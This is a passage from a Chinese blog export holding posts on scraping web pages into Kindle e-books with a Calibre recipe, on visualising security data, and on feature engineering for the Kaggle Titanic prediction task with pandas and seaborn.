爬虫\r\n---\r\n\r\n## 前言\r\n\r\n多读书，读好书很重要，网上的有些精品资源只能在线一页一页翻着看，颇不方便，故研究了一下Calibre，用其强大的爬虫功能抓取这些文章，并自动生成带目录索引的电子书文件(mobi、epub)，以便在Kindle上随时阅读。\r\n\r\n## 编写recipe脚本\r\n\r\n`Calibre` 就不再介绍了，可以自行百度。\r\n\r\nrecipe 其实就是一段python代码，定义 calibre 的抓取行为，通过 Beautiful Soup 筛选出页面中要抓取的元素。相关文档参考：\r\n\r\n> Beautiful Soup 4.2.0 DocumentationAPI Documentation for recipes\r\n> \r\n\r\n简单来说，recipe 是一个固定的模板。找到要抓取的目录和每个目录项链接到相应内容页的正文的Dom元素即可。\r\n\r\n下面以抓取《詩詞金庸》[http://jinyong.ylib.com/works/v1.0/works/poem.htm](http://jinyong.ylib.com/works/v1.0/works/poem.htm) 为例：\r\n\r\n```python\r\n#-*-coding:utf-8-*-\r\nfrom calibre.web.feeds.recipes import BasicNewsRecipe\r\n\r\nclass LouisChaPoem(BasicNewsRecipe):\r\n\ttitle = u'诗词金庸'\r\n\tdescription = u'金庸小說裡出現過的詩詞何其多！但你可知道，書中主角口中吟唱的詞句，究竟是金庸自己作的，還是「移花接木」引過來的呢？卻又是引自何處，原典為何？哈！好奇吧！在閱讀金庸小說之際，千萬別忽略了這許多有趣的中國傳統文化事物。就讓我們從古典詩詞開始尋根，一探金庸文化「寶山」，可別空手而回哦！ '\r\n\turl_prefix = 'http://jinyong.ylib.com/works/v1.0/works/'\r\n\tno_stylesheets = True\r\n\tkeep_only_tags = [ #保留文章正文\r\n\t\tdict(name='font', attrs={'color':['#003366']}),\r\n\t  \tdict(name='td', attrs={'colspan':['3']})\r\n\t]\r\n\tremove_tags = [ #去除多余元素\r\n\t\tdict(name='font', attrs={'color':['#CC3333']})\r\n\t]\r\n\tmax_articles_per_feed = 999 #爬取的文章数目限制\r\n\tdef get_title(self, link):\r\n\t\treturn link.string\r\n\tdef parse_index(self):\r\n\t\tsoup = self.index_to_soup('http://jinyong.ylib.com/works/v1.0/works/poem.htm')\r\n\t\tarticles = []\r\n\t\tfor i in soup.findAll(\"tr\",{\"class\":\"new\"}):\r\n\t\t\tfor link in i.findAll(\"a\"):\r\n\t\t\t\ttitle = self.get_title(link)\r\n\t\t\t\ttitle = title.encode(\"utf-8\")\r\n\t\t\t\turl = self.url_prefix+link[\"href\"]\r\n\t\t\t\ta = {'title': title , 'url':url}\r\n\t\t\t\tarticles.append(a)\r\n\t\tans = [(self.title,articles)]\r\n\t\treturn ans\r\n```\r\n\r\n代码保存为 `LouisChaPoem.recipe` 。整个代码比较简单明了，就不再赘述细节了。运行 `ebook-convert LouisChaPoem.recipe LouisChaPoem.epub`  就可以抓取了。（ebook-convert在calibre的安装目录下）\r\n\r\n## 最后\r\n\r\n看看效果吧，正文：\r\n\r\n![KmYDsZ](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-02/KmYDsZ.jpg)\r\n\r\n最后推荐一些写好的Recipe：\r\n\r\n> [@ericzhang-cn](https://github.com/ericzhang-cn/kindle-open-books)\r\n\r\n> [@mine260309](https://github.com/mine260309/calibre_recipes)\r\n"},{"fields":{"slug":"/博客/Archive/安全数据可视化/","title":"安全数据可视化"},"frontmatter":{"draft":false},"rawBody":"---\r\ntitle: 安全数据可视化\r\ntags:\r\n  - 博客\r\n  - 可视化\r\n  - 安全数据\r\n---\r\n\r\n## 概述\r\n\r\n数据可视化主要旨在借助于图形化手段，清晰有效地传达与沟通信息。随着大数据，机器学习，EDA的发展，数据可视化变得越来越重要。在大量的数据面前，传统方法也无能为力，使用可视化的方法可以快速直观地分析/展示数据。\r\n\r\n## 为什么要可视化数据？\r\n\r\n1. Discovery：用于探索、观察数据，将数据转换为知识。通过视觉展示，能够给人们一些新的观察视角，以便思考、发现这些数据所包含的知识。\r\n2. Understanding：通过可视化，可能会发现一些传统统计学方法/数理知识无法发现的模式/规律/关联，使得研究人员更好地使用这些数据。\r\n3. Informed decisions：快速、准确地将数据所包含的信息传递给读者，在损失一些细节的同时，在几秒钟的时间内将信息传递出去。\r\n\r\n引用[宫一鸣](https://weibo.com/u/3181671860)说的：\r\n\r\n![宫一鸣微博](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-02/QloZrX.jpg)\r\n\r\n《Data-Driven Security: Analysis.Visualization and Dashboards》一书描述了通过了解人类视觉信息系统的运作，来帮助我们创造出优秀数据可视化：视觉信息通过眼睛，从光转化成电信号，这些信息经过**视觉记忆(visual memory)**的若干阶段，每个阶段都有特定的强度、限制以及功能。在我们能够意识到这些信息之前，大脑会快速地扫描视觉区域，这就是**前注意处理(preattentive processing)**。最后，大脑会让眼睛进行一系列的**扫视运动(saccadic movement)，**我们会聚焦在不同的特征上面，来帮助大脑建立视觉画面。\r\n\r\n### 视觉记忆\r\n\r\n- 图像记忆：视觉信息在这里进行十分短暂的停留。这是人们对视觉信息的第一印象，可以通过颜色、形状和其他线条来抓住观众的注意力以及传递一些数据的基本属性信息。\r\n- 工作记忆：在这个阶段，根据任务和对象不同，大脑仅可以容纳三到五个对象，所以在展示数据的时候，应该限制每个视觉效果内部超过五个对象。\r\n- 长期记忆：能够保持几天到几年的记忆，短期记忆是神经连接的暂时性强化，生理上的结构是反响回路（reverberatory circuit），而通过巩固后、可变为长期记忆。\r\n\r\n### 前注意处理\r\n\r\n平时我们在记笔记，画脑图的时候就不知不觉的运用了前注意处理的特点了，即画重点，分类标记等等。前注意处理可以很好地智能分组和聚集重要信息，通过强化部分视觉属性，可以轻松做的这一点，如：\r\n\r\n![c4Eznn](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-02/c4Eznn.jpg)\r\n\r\n![sphQ3z](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-02/sphQ3z.jpg)\r\n\r\n![8F3g1w](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-02/8F3g1w.jpg)\r\n\r\n## ****扫视运动****\r\n\r\n人们在观察事物的时候，眼球会快速地各处移动，通过一系列的观察来建立整个图像。在我们观察一个可视化图像的时候也会这样，人的眼睛会注视在有明显特征的区域，然后在重要的点之间来回跳动，因此我们应该：\r\n\r\n- 不要在仪表盘上过多地展示视觉特征\r\n- 赋予重要信息更明显的视觉特征\r\n- 限制扫视运动耗费的时间\r\n\r\n## 可视化分析\r\n\r\n### 相关知识\r\n\r\n- 统计学知识：很多数据都是数值型(numeric)的，因此均值、中值、方差、标准差、正态分布、蒙特·卡罗方法等等这些东西很有用。\r\n- 可视化知识：美学及可视化方法的选择。\r\n- 安全知识：识别误报、安全事件、安全事故等等。\r\n\r\n### 思考目标\r\n\r\n目标驱动而不是数据驱动。要清楚可视化这些数据的目标是什么，是分析数据找出规律/异常？还是直观的展示数据？还是其他用途？\r\n\r\n## 数据预处理\r\n\r\n- 数据清理：清洗脏数据\r\n- 数据集成：将多文件或者多数据库中的异构数据进行合并，然后存放在一个一致的数据存储中。考虑以下几个问题： 1.模式匹配 2.数据冗余 3.数据值冲突\r\n- 数据变换：1.平滑 2.聚集 3.数据概化 4.规范化：(1)最小-最大规范化 (2)零-均值规范化 (3)小数定标规范化 5.属性构造\r\n- 数据规约：数据过大的情况下，使用数据归约技术获得比原始数据小的多的，但不破坏数据完整性的数据集，该数据集可以得到与原始数据相同的结果\r\n\r\n通过可视化手段，我们可以：\r\n\r\n1. 综合信息，从海量、动态、模糊、矛盾的数据中获取深入的了解。\r\n2. 从可视化中得出意想不到的结论、证实猜想。\r\n3. 实时地将数据转换为有用的知识。\r\n\r\n可视化在数据挖掘中也非常重要，他是连接从数据升华到知识这个过程的桥梁，快速直观地发现数据中存在的规则，特性，走势等等，辅助数据分析及建模过程。前面的[机器学习实战之Kaggle_Titanic预测](http://mars.run/2015/11/Machine%20learning%20kaggle%20titanic-0.8/)就大量使用了可视化技术来辅助分析。\r\n\r\n下图是可视化分析概览：\r\n\r\n![概览](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-02/dUD5Sp.jpg)\r\n\r\n## 常见应用\r\n\r\n| 分析 | 数据名称 | 数据源示例 |\r\n| --- | --- | --- |\r\n| 流量监控 | 网络数据包日志 | Tcpdump,Wireshark |\r\n|  | 网络数据包日志 | CiscoNetFlow |\r\n| 状态监控 | 状态监控日志 | BigBrother,vSphere |\r\n| 事件监控 | IDS/IPS日志 | Snort，Bro |\r\n|  | 防火墙日志 | Cisco，Checkpoint |\r\n|  | 网络应用操作日志 | Apache，Nginx，Exchange，DNS |\r\n|  | 漏洞扫描与监控日志 | Fortify，Nessus，Zabbix |\r\n| 其他日志 | 数据库日志，系统日志等等 |  |\r\n\r\n![常见应用](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-02/tfEAXK.jpg)\r\n\r\n## 参考资料\r\n\r\n1. [网络安全可视化研究综述](http://www.cqvip.com/read/read.aspx?id=27784761)\r\n2. [数据驱动安全：数据安全分析、可视化和仪表盘](https://item.jd.com/11771405.html)\r\n3. [Visual Business Intelligence](https://www.perceptualedge.com/blog/?p=1897)\r\n\r\n"},{"fields":{"slug":"/博客/Archive/机器学习实战之Kaggle_Titanic预测/","title":"机器学习实战之Kaggle_Titanic预测"},"frontmatter":{"draft":false},"rawBody":"---\r\ntitle: 机器学习实战之Kaggle_Titanic预测\r\ntags:\r\n- 博客\r\n- 机器学习\r\n---\r\n\r\n## 介绍\r\n\r\n如果你没有听过Kaggle，那你一定要来了解一下它：\r\n\r\n> Kaggle 为全球顶尖数据科学家举办竞赛活动。那些有着科学难题的公司（比如 NASA）可以通过网络将数据和问题提交给 Kaggle，任何顶尖科学家都可以提交问题解决方案，网站会通过对每位科学家的贡献进行排名。到目前为止，在一场竞赛中至少有 30000 人提交至少一种模型。\r\n\r\n简单来说就是一个数据科学竞赛网站，非常有趣。接下来让我们一起学习机器学习吧。\r\n\r\n这次的任务是：[Titanic-Kaggle](https://www.kaggle.com/c/titanic)\r\n\r\n我们的重点是学习机器学习的过程，所以这次不涉及具体的算法实现，而是使用第三方库来实现算法，这里推荐[scikit-learn](http://scikit-learn.org/stable/)，它提供了许多工具和模型，使用起来非常方便。另外我们还是用了[Pandas](https://pandas.pydata.org/)库( `pandas 是基于 Numpy 构建的含有更高级数据结构和工具的数据分析包` )来提高效率，还有`matplotlib` 和 `Seaborn` ，通过图标直观的观察数据。\r\n\r\n我们先写一段代码来看看原始数据吧。\r\n\r\n```python\r\nimport pandas as pd\r\n\r\ninput_df = pd.read_csv('data/raw/train.csv', header=0)\r\nsubmit_df  = pd.read_csv('data/raw/test.csv',  header=0)\r\n\r\n# 合并他们\r\ndf = pd.concat([input_df, submit_df])\r\n\r\n# 重建index\r\ndf.reset_index(inplace=True)\r\n\r\n# 删除reset_index()产生的index column\r\ndf.drop('index', axis=1, inplace=True)\r\n\r\nprint df.shape[1], \"columns:\", df.columns.values\r\nprint \"Row count:\", df.shape[0]\r\n```\r\n\r\n-   我们把training data 和 test data合并到了一起，因为在提取特征的时候，需要获取value的范围和分布。所以需要将他们合在一起处理。\r\n-   Pandas合并data sets非常灵活，不会影响合并之前的原始数据，使用方便。\r\n\r\n输出如下，共有1309条数据，12个feature：\r\n\r\n```python\r\n12 columns: ['PassengerId' 'Survived' 'Pclass' 'Name' 'Sex' 'Age' 'SibSp' 'Parch'\r\n 'Ticket' 'Fare' 'Cabin' 'Embarked']\r\nRow count: 1309\r\n```\r\n\r\n## 数据预处理\r\n\r\n拿到数据第一步是观察一下数据，看看是否有缺失数据，分析一下相关特征等等。\r\n\r\n```python\r\ndef observe(df):\r\n\tprint \"column: \", df.shape[1]\r\n\tcolumns = df.columns\r\n\tfor i in columns:\r\n\t\tprint i, \"missing \",pd.isnull(df[i]).sum(), \" type:\", df[i].dtypes\r\n\r\n---\r\ncolumn:  12\r\nAge missing  263  type: float64\r\nCabin missing  1014  type: object\r\nEmbarked missing  2  type: object\r\nFare missing  1  type: float64\r\nName missing  0  type: object\r\nParch missing  0  type: int64\r\nPassengerId missing  0  type: int64\r\nPclass missing  0  type: int64\r\nSex missing  0  type: object\r\nSibSp missing  0  type: int64\r\nSurvived missing  418  type: float64\r\nTicket missing  0  type: object\r\n```\r\n\r\n可以看到：\r\n\r\n1.  Survived 的缺失可以忽略，因为`test.csv`中的数据本来就是没有Survived的。\r\n2.  Cabin 缺失很严重，我想可以忽略这一个特征了。\r\n3.  Age 缺失的并不多，而且Age是一个重要的特征，应该保留。\r\n\r\n再看看数据的内容吧：\r\n\r\n```python\r\nprint df.head()\r\n\r\n---\r\nAge Cabin Embarked     Fare  \\\\\r\n0   22   NaN        S   7.2500   \r\n1   38   C85        C  71.2833   \r\n2   26   NaN        S   7.9250   \r\n3   35  C123        S  53.1000   \r\n4   35   NaN        S   8.0500   \r\n\r\n                                                Name  Parch  PassengerId  \\\\\r\n0                            Braund, Mr. Owen Harris      0            1   \r\n1  Cumings, Mrs. John Bradley (Florence Briggs Th...      0            2   \r\n2                             Heikkinen, Miss. Laina      0            3   \r\n3       Futrelle, Mrs. Jacques Heath (Lily May Peel)      0            4   \r\n4                           Allen, Mr. William Henry      0            5   \r\n\r\n   Pclass     Sex  SibSp  Survived            Ticket  \r\n0       3    male      1         0         A/5 21171  \r\n1       1  female      1         1          PC 17599  \r\n2       3  female      0         1  STON/O2. 3101282  \r\n3       1  female      1         1            113803  \r\n4       3    male      0         0            373450\r\n```\r\n\r\n先看看每个特征的含义：\r\n\r\n-   Age （年龄）\r\n-   Cabin（客舱位置）\r\n-   Embarked（港口编号）\r\n-   Fare（票价）\r\n-   Name（姓名）\r\n-   Parch（父母/孩子的数量）\r\n-   PassengerId\r\n-   Pclass（客舱等级）\r\n-   Sex（性别）\r\n-   SibSp（配偶的数量）\r\n-   Survived(存活与否)\r\n-   Ticket（船票编号）\r\n\r\n直观的看，`PassengerId`，`Ticket`没什么用，先忽略他们。\r\n\r\n## 处理缺失数据\r\n\r\n在数据中出现缺失或者错误的Value是很正常的事，一些预测模型可以很好的处理缺失数据 `如神经网络(neural networks)`，有些则需要单独处理他们。我们使用随机森林(Random Forest)来做预测模型，它自身并不能对付缺失数据，所以需要单独进行处理。有两种方法：\r\n\r\n1.  直接扔掉出现缺失Value的数据：只有少量的数据出现缺失Value的情况，这样做比较简单快捷。\r\n2.  给缺失的Value赋特殊值来表明它是缺失的：比较适用于分类变量，因为缺失Value就是不存在的数据，如果给他分配平均值之类的数值并没有什么意义。除非是某些潜在原因使某些缺失值会影响其与另外一个值的关联(correlation)。并且这种方法不适用于连续变量。不过对于二元变量(binary variables)，我们可以把他的缺失值赋为0，正常情况下True为1，False为-1。\r\n\r\n```python\r\ndf['Cabin'][df.Cabin.isnull()] = 'U0'\r\n```\r\n\r\n1.  给缺失的Value赋平均值：这种简单的做法很普遍，对于不重要的特征来说用这种方法足矣。还可以结合其他变量来算平均值。对于分类变量，使用最常见的值或许比平均值更好。\r\n\r\n```python\r\n平均值：\r\ndf['Fare'][ np.isnan(df['Fare']) ] = df['Fare'].median()\r\n最常见的值：\r\ndf.Embarked[ df.Embarked.isnull() ] = df.Embarked.dropna().mode().values\r\n```\r\n\r\n1.  使用机器学习算法/模型来预测缺失数据：感觉只有数据量很大的情况下这样做才有效。\r\n\r\n## 变量转换\r\n\r\n变量转换的目的是将数据转换为模型适用的格式，不同方法实现的随机森林(Random Forest)接受不同类型的数据，Scikit-learn要求数据都是数字型`numeric`，所以我们要将原始数据转换为数字型`numeric`。\r\n\r\n所有的数据可以分为两类：1.定性(Quantitative)变量可以以某种方式排序，Age就是一个很好的列子。2.定量(Qualitative)变量描述了物体的某一（不能被数学表示的）方面，Embarked就是一个例子。\r\n\r\n### 定性(Qualitative)转换\r\n\r\n1.  Dummy Variables：就是类别变量或者二元变量，当qualitative variable是一些频繁出现的几个独立变量时，Dummy Variables比较适合使用。我们以Embarked为例，Embarked只包含三个值`'S','C','Q'`，我们可以使用下面的代码将其转换为dummies:\r\n2.  Factorizing：dummy不好处理Cabin（船舱号）这种标称属性，因为他出现的变量比较多。所以Pandas有一个方法叫做`factorize()`，它可以创建一些数字，来表示类别变量，对每一个类别映射一个ID，这种映射最后只生成一个特征，不像dummy那样生成多个特征。 下面的代码是对Cabin进行Factorizing：\r\n\r\n```python\r\nimport re\r\n\r\n# Replace missing values with \"U0\"\r\ndf['Cabin'][df.Cabin.isnull()] = 'U0'\r\n\r\n# create feature for the alphabetical part of the cabin number\r\ndf['CabinLetter'] = df['Cabin'].map( lambda x : re.compile(\"([a-zA-Z]+)\").search(x).group())\r\n\r\n# convert the distinct cabin letters with incremental integer values\r\ndf['CabinLetter'] = pd.factorize(df['CabinLetter'])[0]\r\n```\r\n\r\n### 定量(Quantitative)转换\r\n\r\n1.  Scaling Scaling可以将一个很大范围的数值映射到一个很小的范围(`通常是-1 - 1，或则是0 - 1`)，很多情况下我们需要将数值做Scaling使其范围大小一样，否则大范围数值特征将会由更高的权重。比如：Age的范围可能只是0-100，而income的范围可能是0-10000000，在某些对数组大小敏感的模型中会影响其结果。\r\n    \r\n    下面的代码是对Age进行Scaling：\r\n    \r\n    ```python\r\n    # StandardScaler will subtract the mean from each value then scale to the unit variance\r\n    scaler = preprocessing.StandardScaler()\r\n    df['Age_scaled'] = scaler.fit_transform(df['Age'])\r\n    ```\r\n    \r\n2.  Binning inning通过观察“邻居”(即周围的值)来连续数据离散化。存储的值被分布到一些“桶”或箱中，就像直方图的bin将数据划分成几块一样。下面的代码对Fare进行Binning。\r\n    \r\n\r\n```python\r\n# Divide all fares into quartiles\r\ndf['Fare_bin'] = pd.qcut(df['Fare'], 4)\r\n\r\n# qcut() creates a new variable that identifies the quartile range, but we can't use the string so either\r\n# factorize or create dummies from the result\r\ndf['Fare_bin_id'] = pd.factorize(df['Fare_bin'])\r\ndf = pd.concat([df, pd.get_dummies(df['Fare_bin']).rename(columns=lambda x: 'Fare_' + str(x))], axis=1)\r\n```\r\n\r\n## 特征提取\r\n\r\n特征提取很重要的一个方面是深入理解数据，并且能提取出新的特征来做预测。机器学习的核心就是模型选取和参数选择，特征提取可以说是重中之重。\r\n\r\n一个特征提取的例子是，从电话号码中提取中国家、地区、城市的信息，或者是从GPS中提取中国家、地区、城市的信息。只要能描述一个事物的qualitative变量，都有可能从中挖掘出有用的特征，另外，时序等信息也是非常有用的。\r\n\r\n泰坦尼克号的这些数据非常简单，我们并不需要对数据做太多的处理，我们下面只对name，cabin和ticket提取一些变量。\r\n\r\n举两个例子吧：\r\n\r\n1.  Name 姓名这个特征本身来说没有什么用，但是我们可以从中提取出一个特征，`称呼`。\r\n    \r\n    称呼，或许不同社会地位的人抢到逃生船的概率不同？代码如下：\r\n    \r\n    ```python\r\n    # What is each person's title? \r\n    df['Title'] = df['Name'].map(lambda x: re.compile(\", (.*?)\\\\.\").findall(x)[0])\r\n    \r\n    # Group low-occuring, related titles together\r\n    df['Title'][df.Title == 'Jonkheer'] = 'Master'\r\n    df['Title'][df.Title.isin(['Ms','Mlle'])] = 'Miss'\r\n    df['Title'][df.Title == 'Mme'] = 'Mrs'\r\n    df['Title'][df.Title.isin(['Capt', 'Don', 'Major', 'Col', 'Sir'])] = 'Sir'\r\n    df['Title'][df.Title.isin(['Dona', 'Lady', 'the Countess'])] = 'Lady'\r\n    \r\n    # Build binary features\r\n    df = pd.concat([df, pd.get_dummies(df['Title']).rename(columns=lambda x: 'Title_' + str(x))], axis=1)\r\n    ```\r\n    \r\n2.  Cabin 客舱信息包含了甲板和房间号，不同甲板位置不同，逃生船数量不同，人群年龄分布不同等等。不同房间号离甲板距离不同，离逃生船距离不同，等等。所以从客舱中提取中`甲板`和`房间号`这两个特征很重要。代码如下：\r\n    \r\n    ```python\r\n    # Replace missing values with \"U0\"\r\n    df['Cabin'][df.Cabin.isnull()] = 'U0'\r\n    \r\n    # Create a feature for the deck\r\n    df['Deck'] = df['Cabin'].map( lambda x : re.compile(\"([a-zA-Z]+)\").search(x).group())\r\n    df['Deck'] = pd.factorize(df['Deck'])[0]\r\n    \r\n    # Create binary features for each deck\r\n    decks = pd.get_dummies(df['Deck']).rename(columns=lambda x: 'Deck_' + str(x))\r\n    df = pd.concat([df, decks], axis=1)\r\n    \r\n    # Create feature for the room number\r\n    df['Room'] = df['Cabin'].map( lambda x : re.compile(\"([0-9]+)\").search(x).group()).astype(int) + 1\r\n    ```\r\n    \r\n\r\n## 开始处理\r\n\r\n前面理论说了那么多，还是实战看看吧，我们要预处理每一个特征。\r\n\r\n### 首先是Age（年龄）\r\n\r\nAge（年龄）有263个缺失项，就简单地用平均值来填充，并看看填充前后的直方图：\r\n\r\n```python\r\nimport pandas as pd\r\nimport matplotlib.pyplot as plt\r\nimport seaborn\r\n\r\nfig, (axis1,axis2) = plt.subplots(1,2,figsize=(15,5))\r\naxis1.set_title('Original Age values')\r\naxis2.set_title('New Age values')\r\naverage_age   = df[\"Age\"].mean()\r\ndf['Age'].plot(kind='hist', bins=70, ax=axis1)\r\ndf['Age'][df.Age.isnull()] = average_age\r\ndf['Age'].plot(kind='hist', bins=70, ax=axis2)\r\nplt.show()\r\n```\r\n\r\n我们得到：\r\n\r\n![e1BIid](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-02/e1BIid.jpg)\r\n\r\n可以看到经过平均值填充后，数据分布并不是很好。试试随机选取`平均值加减标准差`范围的数来改进，使数据更接近真实情况。\r\n\r\n```python\r\nimport numpy as np\r\nimport pandas as pd\r\nimport matplotlib.pyplot as plt\r\nimport seaborn\r\n\r\nfig, (axis1,axis2) = plt.subplots(1,2,figsize=(15,5))\r\naxis1.set_title('Original Age values')\r\naxis2.set_title('New Age values')\r\naverage_age   = df[\"Age\"].mean()\r\nstd_age       = df[\"Age\"].std()\r\ncount_nan_age = df[\"Age\"].isnull().sum()\r\nrand = np.random.randint(average_age - std_age, average_age + std_age, size = count_nan_age)\r\ndf['Age'].plot(kind='hist', bins=70, ax=axis1)\r\ndf['Age'][df.Age.isnull()] = rand\r\ndf['Age'].plot(kind='hist', bins=70, ax=axis2)\r\nplt.show()\r\n```\r\n\r\n我们得到：\r\n\r\n![[Pasted image 20230217002600.png]]\r\n\r\n感觉这样好多了。\r\n\r\n接着，我们需要从年龄中提取一个特征出来，即：孩子。不是说ladies and kids first么？\r\n\r\n```python\r\ndef is_child(age):\r\n\tif age < 16:\r\n\t\treturn 1\r\n\telse:\r\n\t\treturn 0\r\ndf['Child'] = df['Age'].apply(is_child) #小于16岁的认为是孩子\r\nfig, (axis1,axis2) = plt.subplots(1,2,figsize=(10,5))\r\nseaborn.countplot(x='Child', data=df, ax=axis1)\r\nchild_survive = df[[\"Child\", \"Survived\"]].groupby(['Child'],as_index=False).mean()\r\nseaborn.barplot(x='Child', y='Survived', data=child_survive, ax=axis2)\r\nplt.show()\r\n```\r\n\r\n我们得到：\r\n\r\n![eHiKsz](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-02/eHiKsz.jpg)\r\n\r\n孩子只有132人，却有着57%的生存率！看来是否是孩子，这一特征很重要。（数据支持，kids first，后面到Sex分析一下是不是ladies first）\r\n\r\n****Cabin（客舱位置）**** 可以忽略\r\n\r\n```python\r\ndf = df.drop(['Cabin'], axis=1)\r\n```\r\n\r\n****Embarked（港口编号）****\r\n\r\nEmbarked（港口编号）只有2个缺失项，直接用最常见的值填充它，然后用图表看看其与Survived的关系：\r\n\r\n```python\r\nimport numpy as np\r\nimport pandas as pd\r\nimport matplotlib.pyplot as plt\r\nimport seaborn\r\n\r\ndf.Embarked[ df.Embarked.isnull() ] = df.Embarked.dropna().mode().values\r\ninput_df_tmp = df[:input_df.shape[0]] #取出input_df部分，因为只有他们才有Survived特征。\r\n(s,c,q) = df['Embarked'].value_counts()\r\nembark_percentage = pd.DataFrame({ \r\n\t'Embarked' : np.array(['S', 'C', 'Q']),\r\n\t'percentage' : np.array([float(i)/df['Embarked'].count() for i in (s,c,q)])})\r\nfig, (axis1,axis2,axis3) = plt.subplots(1,3,figsize=(15,5))\r\nseaborn.barplot(x='Embarked', y='percentage', data=embark_percentage, ax=axis1)\r\nseaborn.countplot(x='Survived', hue=\"Embarked\", data=input_df_tmp, order=[1,0], ax=axis2)\r\nembark_perc = input_df_tmp[[\"Embarked\", \"Survived\"]].groupby(['Embarked'],as_index=False).mean()\r\nseaborn.barplot(x='Embarked', y='Survived', data=embark_perc,order=['S','C','Q'],ax=axis3)\r\nplt.show()\r\n```\r\n\r\n我们得到：\r\n\r\n![ICrD6R](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-02/ICrD6R.jpg)\r\n\r\n分别是不同Embarked（港口编号）的百分比、不同Embarked（港口编号）生存的数量、不同Embarked（港口编号）的生存率。Embarked（港口编号）特征只有三种取值，且S占70%以上，所以Embarked（港口编号）这个特征应该不要？\r\n\r\n### Fare（票价）\r\n\r\nFare（票价）只有1个缺失项,直接用平均值填充：\r\n\r\n```python\r\ndf[\"Fare\"] = df[\"Fare\"].fillna(df[\"Fare\"].median())\r\n```\r\n\r\n绘图看看Fare（票价）与Survived的关系：\r\n\r\n```python\r\nimport numpy as np\r\nimport pandas as pd\r\nimport matplotlib.pyplot as plt\r\nimport seaborn\r\n\r\nfare_not_survived = df[\"Fare\"][df[\"Survived\"] == 0]\r\nfare_survived     = df[\"Fare\"][df[\"Survived\"] == 1]\r\navgerage_fare = DataFrame([fare_not_survived.mean(), fare_survived.mean()])\r\ndf['Fare'].plot(kind='hist', figsize=(15,3), bins=100, xlim=(0,50))\r\navgerage_fare.index.names =  [\"Survived\"]\r\navgerage_fare.plot(kind='bar', legend=False)\r\nplt.show()\r\n```\r\n\r\n我们得到：\r\n\r\n![rwPHr3](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-02/rwPHr3.jpg)\r\n![nrJ4Up](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-02/nrJ4Up.jpg)\r\n\r\n可以看出票价集中在10左右，幸存的人的票价平均在48。\r\n\r\n### Pclass（客舱等级）\r\n\r\nPclass（客舱等级）考虑做Dummy Variables处理，使其生成更多的特征。\r\n\r\n```python\r\nimport numpy as np\r\nimport pandas as pd\r\nimport matplotlib.pyplot as plt\r\nimport seaborn\r\n\r\ninput_df_tmp = df[:input_df.shape[0]]\r\nseaborn.factorplot('Pclass', 'Survived', order=[1,2,3], data=input_df_tmp, size=6)\r\nplt.show()\r\n```\r\n\r\n![1h3Dsf](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-02/1h3Dsf.jpg)\r\n\r\n得到Pclass与Survived的关系，可以看出Pclass为3的生存率很低，我们试试把它的Dummy Variables去掉：\r\n\r\n```python\r\nimport numpy as np\r\nimport pandas as pd\r\nimport matplotlib.pyplot as plt\r\nimport seaborn\r\n\r\npclass_dummies  = pd.get_dummies(df['Pclass'])\r\npclass_dummies.columns = ['Class_1','Class_2','Class_3']\r\npclass_dummies.drop(['Class_3'], axis=1, inplace=True)\r\ndf.drop(['Pclass'],axis=1,inplace=True)\r\ndf = df.join(pclass_dummies)\r\n```\r\n\r\n### Sex（性别）\r\n\r\n老规矩，首先看看Sex与Survived的关系：\r\n\r\n```python\r\nimport numpy as np\r\nimport pandas as pd\r\nimport matplotlib.pyplot as plt\r\nimport seaborn\r\n\r\nfig, (axis1,axis2) = plt.subplots(1,2,figsize=(15,5))\r\nseaborn.countplot(x='Sex', data=df, ax=axis1)\r\nwomen_survive = df[[\"Sex\", \"Survived\"]].groupby(['Sex'],as_index=False).mean()\r\nseaborn.barplot(x='Sex', y='Survived', data=women_survive, ax=axis2)\r\nplt.show()\r\n```\r\n\r\n我们得到：\r\n\r\n![YC3mXf](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-02/YC3mXf.jpg)\r\n\r\n果然是Ladies First呀！将Sex用数字表示:\r\n\r\n```python\r\ndf['Sex'][df['Sex'] == 'male'] = 1\r\ndf['Sex'][df['Sex'] == 'female'] = 0\r\ndf['Sex'] = df['Sex'].astype(int)\r\n```\r\n\r\n现在除去之前已经drop的`PassengerId`,`Ticket`,`Cabin`,只剩下`Name`,`Parch`和`SibSp`了。\r\n\r\n### Name（姓名），Parch（父母/孩子的数量），SibSp（配偶的数量）\r\n\r\n我们需要从这里面提取中他们是否有家人在船上这一特征，因为有家人意味着逃生过程中会有家人的帮助，生存率可能更高。\r\n\r\n```python\r\nimport numpy as np\r\nimport pandas as pd\r\nimport matplotlib.pyplot as plt\r\nimport seaborn\r\n\r\ndf['WithFamily'] =  df[\"Parch\"] + df[\"SibSp\"]\r\ndf['WithFamily'].loc[df['WithFamily'] > 1] = 1\r\ndf['WithFamily'].loc[df['WithFamily'] == 0] = 0\r\n#绘图\r\ninput_df_tmp = df[:input_df.shape[0]]\r\nfig, (axis1,axis2) = plt.subplots(1,2,sharex=True,figsize=(10,5))\r\nseaborn.countplot(x='WithFamily', data=df, order=[1,0], ax=axis1)\r\nfamily_perc = input_df_tmp[[\"WithFamily\", \"Survived\"]].groupby(['WithFamily'],as_index=False).mean()\r\nseaborn.barplot(x='WithFamily', y='Survived', data=family_perc, order=[1,0], ax=axis2)\r\naxis1.set_xticklabels([\"With Family\",\"Alone\"], rotation=0)\r\nplt.show()\r\n```\r\n\r\n我们得到:\r\n\r\n![88czBr](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-02/88czBr.jpg)\r\n\r\n可以看到，有家人在船上的人有更高的生存率；特征就处理到这里吧。\r\n\r\n## 